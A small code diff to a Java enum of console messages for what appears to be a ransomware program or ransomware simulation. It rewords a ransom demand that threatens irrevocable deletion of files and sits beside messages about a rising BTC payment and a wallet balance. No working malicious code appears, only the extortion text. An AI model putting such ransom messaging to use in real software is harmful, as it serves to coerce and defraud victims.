@@ -11,7 +11,7 @@ public enum ConsoleCorrespondation {
     M_TRANSACTIONSUCCESS(">>Transaction successful"),
     M_TRANSACTIONFAIL(">>Transaction failed"),
     M_RANSOMINCREASED(">>Amount to pay increased by 0,01 BTC to: "),
-    M_RANSOMFINAL(">>Pay BTC immediately or your files will be irrevocably deleted"),
+    M_RANSOMFINAL(">>Pay immediately or your files will be irrevocably deleted: "),
     M_WALLETBALANCE(">>Wallet balance: "),
     M_SHOWRECIPIENT(">>Recipient: ");
 
